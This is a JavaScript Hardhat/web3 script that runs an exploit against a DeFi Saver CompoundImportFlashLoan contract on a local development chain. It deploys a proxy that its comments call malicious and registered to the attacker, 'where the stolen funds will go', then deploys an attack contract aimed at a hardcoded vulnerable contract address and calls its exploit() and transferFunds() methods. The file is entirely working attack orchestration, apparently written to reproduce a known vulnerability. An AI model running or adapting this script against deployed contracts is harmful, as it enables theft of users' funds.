
const hre = require("hardhat");

async function main() {
  await hre.run('compile');
  
  const myDummyAccount = "0x8626f6940e2eb28930efb4cef49b2d1f2c9c1199";
  const _gas = 15000000;
  const _gasPrice = '30000000000000';


  const web3 = new Web3("http://127.0.0.1:8545/");


  const jsonAttackFile = require('../artifacts/contracts/Attacker.sol/Attack.json');
  const jsonAttackABI = jsonAttackFile.abi;

  var atkContract = new web3.eth.Contract(jsonAttackABI);
  atkContract.options.data = jsonAttackFile.bytecode;


  const jsonAttackProxyFile = require('../artifacts/contracts/DefiSaverWallet.sol/DefiSaverWallet.json');
  const jsonAttackProxyABI = jsonAttackProxyFile.abi;

  var atkProxyContract = new web3.eth.Contract(jsonAttackProxyABI);
  atkProxyContract.options.data = jsonAttackProxyFile.bytecode;

  var vulnContractAddress = "0xaf9f8781A4c39Ce2122019fC05F22e3a662B0A32";


  console.log("Beginning...");


  var deployVulnContractFlag = false;
  if (deployVulnContractFlag)
  {
    const jsonVulnContrFile = require('../artifacts/contracts/CompoundImportFlashLoan.sol/CompoundImportFlashLoan.json');
    const jsonVulnContrABI = jsonVulnContrFile.abi;

    var vulnContract = new web3.eth.Contract(jsonVulnContrABI);
    vulnContract.options.data = jsonVulnContrFile.bytecode;

    ////////////////////////

    await vulnContract.deploy({ })
    .send({
        from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
    }, function(error, transactionHash){ console.log(error, transactionHash); })
    .on('error', function(error){ console.log(error); })
    .then(function(newContractInstance){
        console.log("Vuln Contract address: ", newContractInstance.options.address)
        vulnContract.options.address = newContractInstance.options.address;
    });
    vulnContractAddress = vulnContract.options.address;
  }

  ////////////////////////

  await atkProxyContract.deploy({ arguments: [myDummyAccount] })  // Create malicious proxy registered to the attacker
  .send({                                                         // - this is where the stolen funds will go
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("ATK Proxy address: ", newContractInstance.options.address)
      atkProxyContract.options.address = newContractInstance.options.address;
  });


  ////////////////////////

  await atkContract.deploy({ arguments: [ atkProxyContract.options.address, vulnContractAddress ] })
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("ATK address: ", newContractInstance.options.address)
      atkContract.options.address = newContractInstance.options.address;
  });
  
  await atkContract.methods.exploit().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkContract.methods.transferFunds().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkContract.methods.checkBalance().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });


  console.log("Exitting...");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
